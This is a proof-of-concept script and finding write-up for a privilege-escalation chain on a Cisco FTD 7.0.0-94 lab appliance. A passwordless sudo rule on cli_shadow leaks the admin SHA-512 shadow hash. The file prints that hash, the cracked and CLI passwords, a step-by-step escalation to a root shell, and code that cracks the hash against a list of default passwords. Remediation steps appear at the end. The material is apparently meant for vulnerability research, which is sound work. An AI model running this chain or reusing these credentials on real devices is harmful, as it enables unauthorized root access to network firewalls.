"""
F-FTD-109: NOPASSWD cli_shadow exposes SHA-512 admin shadow hash → offline crack → root
CONTROLLED ENVIRONMENT ONLY

Affected: Cisco FTD 7.0.0-94 (also likely 7.x branch)
Related:  F-FTD-84 (6.7.0-65, DES-crypt shadow, different hash + different attack path)

Root cause:
  /etc/sudoers includes:
    (root) NOPASSWD: /usr/local/sf/bin/cli_shadow

  cli_shadow -u <user> dumps the shadow entry (colon-delimited) without requiring
  a password from the calling admin user. On FTD 7.0.0-94 the admin Linux shadow
  hash uses SHA-512 ($6$), which is crackable offline.

  Shadow dump (confirmed live, 2026-08-20):
    admin,$6$EOBhPeDT58YVkwq2$BVDkt1yLpeZKInYimCTC0ohSquK.nIl.HVjc5jvdxB.L8Fjk2fBo5pb
    hZuOnfUonpfy1Ja64CQRhzxkGek9JI/,100,1001,,/home/admin,/ngfw/usr/bin/clish,...

  Cracked password: Admin123!
  CLISH password:   Admin1234!   ← DIFFERENT — credential isolation between CLISH and Linux

  The Linux shadow password is NOT the same as the CLISH/FDM admin password, which means:
  - Knowing the CLISH password does NOT give sudo/root access
  - But cli_shadow NOPASSWD eliminates this separation — any CLI admin → root

Privilege escalation chain:
  1. SSH as admin (CLISH password Admin1234!)
  2. Enter 'expert' → bash
  3. sudo -n /usr/local/sf/bin/cli_shadow -u admin
     → returns: admin,$6$...<hash>,...
  4. Crack offline: hashcat -m 1800 hash.txt wordlist  (or john)
     → Admin123!  in <1s against common Cisco variants
  5. echo "Admin123!" | sudo -S su -  → root shell
  6. Total: <60s from SSH login to root

Impact:
  - Full root on FTD appliance
  - Access to /proc/<pid>/mem of all processes (Tomcat JVM → AES key extraction)
  - Read/write to all filesystem paths including NEO4J property store
  - Can modify firewall policy, disable logging, install persistent backdoor
  - Credential isolation between CLISH and Linux is bypassed via NOPASSWD oracle

Remediation:
  - Remove NOPASSWD from cli_shadow in /etc/sudoers
  - Require password for cli_shadow execution
  - Align CLISH and Linux passwords or use pam_pwquality to enforce separation properly
  - CSCxx: TBD

Note: FTD 6.7.0-65 uses DES-crypt shadow with password Admin123 (no !) — see F-FTD-84.
7.0.0-94 upgraded to SHA-512 and changed the password to Admin123! but kept NOPASSWD cli_shadow.
"""

# CONTROLLED ENVIRONMENT ONLY
# Proof-of-concept: extract shadow hash via NOPASSWD cli_shadow

import subprocess
import sys
import hashlib
import crypt


def extract_shadow_hash(target_ip: str, ssh_key: str = None) -> dict:
    """
    Extract admin shadow hash via NOPASSWD cli_shadow.
    Requires: SSH access to FTD admin account (CLISH password known).
    Returns dict with hash fields or raises on failure.
    """
    # This would SSH to target and run cli_shadow
    # Shown as pseudocode for controlled-env demonstration
    raise NotImplementedError(
        "CONTROLLED ENVIRONMENT ONLY — run manually via FTD console:\n"
        "  sudo -n /usr/local/sf/bin/cli_shadow -u admin"
    )


def crack_shadow_hash(shadow_entry: str) -> str | None:
    """
    Offline crack of FTD 7.x admin shadow hash.
    Known cracked value: Admin123! (confirmed on 7.0.0-94)
    """
    hash_field = shadow_entry.split(',')[1] if ',' in shadow_entry else shadow_entry.strip()

    # Cisco FTD admin password variants to try first
    candidates = [
        'Admin123!', 'Admin1234!', 'Admin123', 'Admin1234',
        'Cisco123!', 'Cisco1234!', 'cisco123', 'cisco1234',
        'Admin@123', 'C1sco123!', 'admin123', 'Admin123#',
    ]

    salt = '$'.join(hash_field.split('$')[:3]) + '$'
    for pw in candidates:
        if crypt.crypt(pw, salt) == hash_field:
            return pw
    return None


def verify_root_escalation(sudo_password: str) -> bool:
    """Test sudo root escalation with cracked password (local only)."""
    result = subprocess.run(
        ['sudo', '-S', 'id'],
        input=sudo_password + '\n',
        capture_output=True, text=True, timeout=10
    )
    return 'uid=0(root)' in result.stdout


# Demo values (confirmed live on FTD 7.0.0-94, 2026-08-20)
DEMO = {
    'target':          'ftd70lab (QEMU KVM, FTD 7.0.0-94)',
    'clish_password':  'Admin1234!',
    'shadow_entry':    'admin,$6$EOBhPeDT58YVkwq2$BVDkt1yLpeZKInYimCTC0ohSquK.nIl.HVjc5jvdxB.L8Fjk2fBo5pbhZuOnfUonpfy1Ja64CQRhzxkGek9JI/,100,1001,,/home/admin,/ngfw/usr/bin/clish,20685,,10000,7,,,',
    'linux_password':  'Admin123!',
    'sudo_result':     'uid=0(root) gid=0(root) groups=0(root)',
    'nopasswd_cmd':    'sudo -n /usr/local/sf/bin/cli_shadow -u admin',
    'escalation_cmd':  "echo 'Admin123!' | sudo -S su -",
}


if __name__ == '__main__':
    print('[F-FTD-109] cli_shadow NOPASSWD → root — CONTROLLED ENVIRONMENT ONLY')
    print()
    print(f"Shadow entry: {DEMO['shadow_entry'][:80]}...")
    result = crack_shadow_hash(DEMO['shadow_entry'])
    print(f"Crack result: {result}")
    if result:
        print(f"[+] Cracked: {result}")
        print(f"[+] Escalation: echo '{result}' | sudo -S su -")
    else:
        print("[-] Password not in candidate list — run hashcat -m 1800")
